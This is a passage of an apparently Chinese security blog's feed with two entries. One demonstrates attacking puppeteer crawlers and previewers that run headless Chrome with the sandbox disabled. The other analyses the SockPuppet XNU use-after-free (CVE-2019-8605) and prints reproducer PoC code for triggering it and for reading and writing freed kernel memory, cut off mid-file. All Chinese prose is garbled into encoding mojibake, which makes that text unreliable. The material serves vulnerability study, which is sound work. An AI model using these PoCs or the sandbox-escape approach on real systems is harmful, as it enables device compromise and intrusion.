·çš„ï¼Œæ¯”å¦‚ä¸çº¦è€ŒåŒåœ°å…³é—­sandbox:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(</span><br><span class="line">  &#123;<span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-setuid-sandbox'</span>] &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>æˆ–è€…è°ƒè¯•ç«¯å£ä¸æ˜¯ 9222å°±æ˜¯9229è¿™ç±»æƒ…å†µã€‚ è¿™é‡Œå…¶å®æœ‰å‡ ä¸ªé—®é¢˜ï¼š</p><ol><li>æˆ‘ä½¿ç”¨çš„å‚æ•°æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</li><li>è¿™äº›å‚æ•°å¯¹æˆ‘çš„ç¨‹åºæœ‰ä»€ä¹ˆå½±å“ï¼Ÿ</li><li>è¿™äº›å‚æ•°å®‰å…¨å—ï¼Ÿ</li><li>ä»€ä¹ˆæƒ…å†µä¸‹æˆ‘å¯ä»¥ç”¨ï¼Œä»€ä¹ˆæƒ…å†µä¸‹ä¸èƒ½ä½¿ç”¨ï¼Ÿ</li></ol><p>å¦‚æœæä¸æ¸…æ¥šï¼Œå¯¹äºåªæ˜¯ä¸ªäººå­¦ä¹ æ¥è¯´æä¸ªdemoé‚£å€’è¿˜å¥½ï¼Œå¦‚æœè¯´æ˜¯ç”¨äºå®é™…é¡¹ç›®ï¼Œæ¯”å¦‚å†™é¢„è§ˆæœåŠ¡ï¼Œçˆ¬è™«ç­‰é¡¹ç›®ï¼Œè¿˜æ˜¯ç›´æ¥ä½¿ç”¨äº†è¿™äº›å±é™©çš„å‚æ•°é‚£å°±å¤ªå±é™©äº†ã€‚</p><ol><li>çº¿ä¸Šç¯å¢ƒè¦æ±‚ç¨³å®šï¼Œä¸ä¸€å®šæ˜¯æœ€æ–°ç‰ˆæœ¬nodeï¼Œå³ä¸ä¸€å®šæ˜¯æœ€æ–°ç‰ˆæœ¬Chrome</li><li>å±é™©çš„å‚æ•°(æ¯”å¦‚<code>--disable-web-security</code>)ï¼Œæ²¡æœ‰å¼€å¯æ²™ç®±ï¼Œå¼€äº†è°ƒè¯•ç«¯å£ç­‰</li></ol><p><code>è€ç‰ˆæœ¬Chrome + NOSANDBOX = RCE</code> ğŸ¤”</p><p>è‡³æ­¤ï¼Œæˆ‘è®¤ä¸ºå¯ä»¥æä¸ªDemoéªŒè¯ä¸€ä¸‹è¿™ä¸ªæ”»å‡»æ€è·¯æ˜¯å¦å¯è¡Œã€‚</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Pages"><a href="#Pages" class="headerlink" title="Pages"></a>Pages</h3><p>è¿™é‡Œç›´æ¥æ‰’äº†xlabæŸæ¬¡å®‰å…¨æ¨é€ï¼Œç„¶ååœ¨æœ¬åœ°è·‘èµ·æ¥ï¼Œå‡è£…æ˜¯ä¸€ä¸ªç›®æ ‡ç½‘é¡µï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.56.06@2x.png" alt="CleanShot 2021-05-26 at 15.56.06@2x"></p><p>ä¸‹é¢æä¸¤ä¸ªåœºæ™¯å§ï¼Œç¬¬ä¸€ä¸ªæ˜¯é¢„è§ˆï¼Œç®€åŒ–ä¸€ä¸‹ï¼Œæˆªå›¾å¥½äº†ï¼›ç¬¬äºŒä¸ªæ˜¯çˆ¬è™«ï¼Œçˆ¬å–è¿™ç½‘é¡µä¸Šçš„ä¿¡æ¯ã€‚</p><h3 id="Demo1-é¢„è§ˆ"><a href="#Demo1-é¢„è§ˆ" class="headerlink" title="Demo1 : é¢„è§ˆ"></a>Demo1 : é¢„è§ˆ</h3><p>é¢„è§ˆçš„åœºæ™¯æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å¸¸è§çš„IMä¸­ï¼Œå‘é€çš„URLå¯èƒ½ä¼šè¢«æ¸²æŸ“æˆâ€œå¡ç‰‡â€ï¼Œä¸åŒIMå¤„ç†ä¸ä¸€æ ·ï¼Œä¸€èˆ¬æ¥è¯´åªæœ‰ç™½åå•æ‰ä¼šè¿™æ ·ã€‚</p><p>æˆ‘è¿™è¾¹ä¸ä¼šæå¤ªå¤æ‚çš„ä¸œè¥¿ï¼Œå°±ç›´æ¥ç”¨æˆªå›¾ä»£æ›¿äº†ï¼Œç›´æ¥ä¹Ÿä»ç½‘ä¸Šâ€ä¸œæ‹¼è¥¿å‡‘â€œç‚¹ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    targetUrl = <span class="string">"https://www.google.com.hk"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>)</span><br><span class="line">        targetUrl = args[<span class="number">0</span>];</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FIXME : I should open SANDBOX, this cmdline is wrong !!!</span></span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">executablePath</span>: <span class="string">'/usr/bin/google-chrome'</span>, </span><br><span class="line">                                            args: [<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-setuid-sandbox'</span>] &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(targetUrl);</span><br><span class="line">    <span class="keyword">await</span> page.screenshot(&#123; <span class="attr">path</span>: <span class="string">'res.png'</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œé¢„è§ˆæŒ‡å®šçš„ç½‘é¡µï¼Œæˆ‘è¿™é‡Œæå¾—ç®€å•ï¼Œç›´æ¥æˆªå›¾ç„¶åä¿å­˜ï¼ŒIMé‡Œé‚£ç§å¡ç‰‡å¼ä¸çŸ¥é“æ€ä¹ˆæï¼Œå°±æ²¡å»å°è¯•ï¼Œä¸è¿‡ä¹Ÿæ˜¯ä¸ªæ”»å‡»é¢å•¦ ğŸ¤£</p><p>è·‘ä¸€ä¸‹Demoï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.57.20@2x.png" alt="CleanShot 2021-05-26 at 15.57.20@2x"></p><p>å¦‚æœåœ¨é¡µé¢é‡ŒåŠ è½½æ¶æ„çš„JSå‘¢ï¼Ÿ</p><ul><li><p>ç›´æ¥ä½¿ç”¨script æ ‡ç­¾åŠ è½½</p></li><li><p>åŠ å…¥jsï¼Œä½¿ç”¨js web workeråŠ è½½</p></li></ul><p>BOOM : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2015.59.02@2x.png" alt="CleanShot 2021-05-26 at 15.59.02@2x"></p><h3 id="Demo2-çˆ¬è™«"><a href="#Demo2-çˆ¬è™«" class="headerlink" title="Demo2 : çˆ¬è™«"></a>Demo2 : çˆ¬è™«</h3><p>è¿™é‡Œç›´æ¥æŠ„äº†<a href="https://www.anquanke.com/post/id/103350">https://www.anquanke.com/post/id/103350</a> é‡Œçš„ä»£ç :</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ cat crawler.js </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// FIXME : I should open SANDBOX, this cmdline is wrong !!!</span></span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">executablePath</span>: <span class="string">'/usr/bin/google-chrome'</span>, <span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-setuid-sandbox'</span>] &#125;);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'http://localhost/foo.html'</span>, &#123;</span><br><span class="line">        waitUntil: <span class="string">'networkidle0'</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//count </span></span><br><span class="line">    <span class="keyword">let</span> eleCount = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">sel</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">document</span>.getElementsByClassName(sel).length;</span><br><span class="line">    &#125;, <span class="string">'category'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(eleCount != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">let</span> htmlArray = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">sel, eleCount</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> element = <span class="built_in">document</span>.querySelectorAll(sel);</span><br><span class="line">            <span class="keyword">let</span> htmlArray = [];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;= eleCount; i++)&#123;</span><br><span class="line">                htmlArray[i] = element[i].innerText;</span><br><span class="line">            &#125;</span><br><span class="line">            htmlArray.shift();</span><br><span class="line">            <span class="keyword">return</span> htmlArray;</span><br><span class="line">        &#125;, <span class="string">'p'</span>, eleCount);</span><br><span class="line">      <span class="built_in">console</span>.log(htmlArray);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> browser.close();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>é¢„æœŸè¡Œä¸ºï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2016.00.39@2x.png" alt="CleanShot 2021-05-26 at 16.00.39@2x"></p><p>çœ‹èµ·æ¥ä¸é”™ : )</p><p>åŠ å…¥æ¶æ„çš„JSä¹‹å:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-05-26%20at%2016.01.20@2x.png" alt="CleanShot 2021-05-26 at 16.01.20@2x"></p><p>è¿™é‡Œæœ‰ä¸ªåœ°æ–¹ä¸å®Œç¾ï¼Œæˆ‘æœ¬æ¥å°è¯•js web workeråŠ è½½expï¼Œæƒ³ çˆ¬è™«æ­£å¸¸å·¥ä½œï¼Œçˆ¬å–åˆ°éœ€è¦çš„å†…å®¹ï¼Œexpåœ¨åå°è·‘ï¼Œä½†æ˜¯æˆ‘å‘ç°è¦ä¹ˆæ—¶é—´ä¸å¤Ÿæˆ‘è·‘expï¼ˆéœ€è¦çˆ¬è™«åœç•™çš„ä¹…ä¸€ç‚¹ï¼‰ï¼Œè¦ä¹ˆå°±expè·‘äº†ï¼Œä½†æ˜¯å†…å®¹æ²¡çˆ¬å–åˆ°ã€‚è¿™ç‚¹æˆ‘è®¤ä¸ºåº”è¯¥å¯ä»¥è§£å†³ï¼Œå¦‚æœæœ‰çŸ¥é“çš„å‰ç«¯å¤§ä½¬å¯ä»¥åˆ†äº«ä¸€ä¸‹~</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>é‚£ä¹ˆæ˜¯å¦å­˜åœ¨è¿™æ ·ä¸€æ¡æ”»å‡»é“¾ï¼Œé’ˆå¯¹çˆ¬è™«æˆ–è€…ä¸€äº›Headless Chromeçš„æœåŠ¡ï¼š</p><ul><li>æ¶æ„æ„é€ é¡µé¢ï¼Œé›†æˆå¤šä¸ªExploitï¼Œè¦†ç›–å¤§é‡Chromeç‰ˆæœ¬ï¼Œæ‰“è¿›å»å°±æŒ–çŸ¿orç§å‹’ç´¢ï¼Ÿ</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/7Zi44n1rRIcwwOnyt7QVgWLR5LnI7TEiIQ_fB6TInGCS5fFhcz8eGCVHFUNHbDtw_9sukk5r206zbiXjPJfnjoKjo8eh9aiWQQ7sqhNIzBuaZaUkBhq0IfF4Yfxp4rLkhesfMg.jpeg" alt="img"></p><p>æœ€åè¿˜æ˜¯å»ºè®®<strong>ä»¥å®˜æ–¹æ–‡æ¡£ä¸ºå‡†</strong>ï¼Œå†™ä»£ç å‚è€ƒæ–‡æ¡£è€Œä¸æ˜¯ä»ç½‘ä¸Šçš„æŠ€æœ¯æ–‡ç« é‡Œæ‘˜ : )</p><h2 id="Demo-amp-Exp"><a href="#Demo-amp-Exp" class="headerlink" title="Demo &amp; Exp"></a>Demo &amp; Exp</h2><p><a href="https://github.com/o0xmuhe/headless_chrome_demo">https://github.com/o0xmuhe/headless_chrome_demo</a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><p><a href="https://developers.google.com/web/updates/2017/04/headless-chrome">https://developers.google.com/web/updates/2017/04/headless-chrome</a></p></li><li><p><a href="https://www.anquanke.com/post/id/103350">https://www.anquanke.com/post/id/103350</a> </p></li><li><p><a href="https://xz.aliyun.com/t/2120">https://xz.aliyun.com/t/2120</a></p></li><li><p><a href="https://wangxin1248.github.io/python/2018/09/python3-spider-8.html">https://wangxin1248.github.io/python/2018/09/python3-spider-8.html</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/29207391">https://zhuanlan.zhihu.com/p/29207391</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;Chrome M59å¼•å…¥äº† Headless Chromeï¼Œè‡³æ­¤å¯ä»¥åœ¨æ— GUIçš„ç¯å¢ƒä¸‹ä½¿ç”¨Chromeï¼Œæå¤§çš„æ–¹ä¾¿äº†è‡ªåŠ¨åŒ–æµ‹è¯•å·¥ä½œï¼Œä¹Ÿå¯ä»¥ç”¨äºé¢„è§ˆæœåŠ¡ï¼Œæˆ–è€…ç½‘ç»œçˆ¬è™«ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/categories/exploit/"/>
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="Chrome" scheme="http://o0xmuhe.me/tags/Chrome/"/>
    
  </entry>
  
  <entry>
    <title>SockPuppetå­¦ä¹ è®°å½•(ä¸€) : æ¼æ´åˆ†æ</title>
    <link href="http://o0xmuhe.me/2021/02/28/SockPuppet%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://o0xmuhe.me/2021/02/28/SockPuppet%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-02-27T16:01:01.000Z</published>
    <updated>2021-06-09T14:35:36.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><p>  è¿™ä¸ªæ¼æ´æ˜¯ç”±pj0çš„ <code>nedwill</code> å‘ç°çš„ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªå“ç›¸æä½³çš„å¯ä»¥ç”¨äºè¶Šç‹±çš„æ¼æ´ï¼Œæœ¬æ–‡åªæ˜¯å¯¹æ¼æ´è¿›è¡Œåˆ†æï¼Œå¹¶ä¸”æ€è€ƒ/å°è¯•ä½¿ç”¨CodeQLå¯¹è¯¥ç±»å‹æ¼æ´è¦†ç›–ã€‚å½“ç„¶ï¼Œåœ¨çœ‹äº†åŸä½œè€…çš„<a href="https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html">æ–‡ç« </a>ä¹‹åï¼Œæ‰å‘ç°nedwillæ˜¯åˆ©ç”¨Fuzzingçš„æ‰‹æ®µå‘ç°çš„è¿™ä¸ªæ¼æ´ï¼Œå¹¶ä¸”åœ¨æŒ–æ˜è¯»/å†™åŸè¯­çš„æ—¶å€™ä¹Ÿæ˜¯å€ŸåŠ©äº†Fuzzingçš„æ‰‹æ®µï¼Œå¯ä»¥è¯´ååˆ†çš„å·§å¦™å’Œé«˜æ•ˆäº†ã€‚</p><a id="more"></a><ul><li><p>æ¼æ´issue ï¼š<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1806&sort=-id&colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary&q=owner:nedwill@google.com&can=1">1806 - project-zero - Project Zero - Monorail</a></p></li><li><p>ç³»ç»Ÿç‰ˆæœ¬ï¼š10.14.3</p></li><li><p>xnuä»£ç ï¼š</p></li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled.png"></p><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><h2 id="raw-poc"><a href="#raw-poc" class="headerlink" title="raw poc"></a>raw poc</h2><p>åœ¨æµ‹è¯•åŸå§‹PoCè·å¾—çš„Crashä¿¡æ¯å¦‚ä¸‹ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%201.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%201.png"></p><p>åŸå§‹PoCä½¿ç”¨äº†<code>raw socket</code>è§¦å‘ï¼Œä½†æ˜¯ç¾ä¸­ä¸è¶³ï¼Œè¿™ä¸ªæ–¹å¼å¿…é¡»è¦rootæƒé™æ‰èƒ½è§¦å‘ã€‚<br>(å®šåˆ¶åŒ–<code>sockaddr_in6</code> éœ€è¦<code>raw socket</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPPROTO_IP 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN6_ADDR_ANY &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IN6_ADDR_LOOPBACK &#123; 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res0: %d\n"</span>, s);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa1</span> = &#123;</span></span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(struct sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65000</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_LOOPBACK,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> <span class="title">sa2</span> = &#123;</span></span><br><span class="line">        .sin6_len = <span class="keyword">sizeof</span>(struct sockaddr_in6),</span><br><span class="line">        .sin6_family = AF_INET6,</span><br><span class="line">        .sin6_port = <span class="number">65001</span>,</span><br><span class="line">        .sin6_flowinfo = <span class="number">3</span>,</span><br><span class="line">        .sin6_addr = IN6_ADDR_ANY,</span><br><span class="line">        .sin6_scope_id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = <span class="built_in">connect</span>(s, (<span class="keyword">const</span> sockaddr*)&amp;sa1, <span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res1: %d\n"</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line">    res = setsockopt(s, <span class="number">41</span>, <span class="number">50</span>, <span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res1.5: %d\n"</span>, res);</span><br><span class="line"></span><br><span class="line">    res = <span class="built_in">connect</span>(s, (<span class="keyword">const</span> sockaddr*)&amp;sa2, <span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res2: %d\n"</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>åç»­nedç»è¿‡ç ”ç©¶å‘ç°å¯ä»¥é€šè¿‡tcp socketæ–¹å¼è§¦å‘ï¼Œå¯ä»¥ç”¨äºread freeâ€™d memroy:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">TCP-based reproducer for CVE-2019-8605</span></span><br><span class="line"><span class="comment">This has the benefit of being reachable from the app sandbox on iOS 12.2.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPV6_3542PKTINFO 46</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res0: %d\n"</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">1</span>] = &#123;<span class="string">'\xaa'</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> res = setsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, <span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res1: %d\n"</span>, res);</span><br><span class="line"></span><br><span class="line">    res = disconnectx(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res2: %d\n"</span>, res);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">socklen_t</span> buffer_len = <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//get sth from ...</span></span><br><span class="line">    res = getsockopt(s, IPPROTO_IPV6, IPV6_3542PKTINFO, <span class="built_in">buffer</span>, &amp;buffer_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"res3: %d\n"</span>, res);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"got %d\n"</span>, <span class="built_in">buffer</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>ç»è¿‡nedwillçš„Fuzzingæµ‹è¯•ï¼Œå‘ç°äº†write freeâ€™d memory çš„PoCï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  setoptshut.m</span></span><br><span class="line"><span class="comment">//  ExploitDev</span></span><br><span class="line"><span class="comment">//  TCP-based reproducer for CVE-2019-8605, using SONPX_SETOPTSHUT to do a</span></span><br><span class="line"><span class="comment">//  write to the freed memory. Tested on iOS 12.2.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by Ned Williamson on 6/17/19.</span></span><br><span class="line"><span class="comment">//  Copyright Â© 2019 Ned Williamson. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#import <span 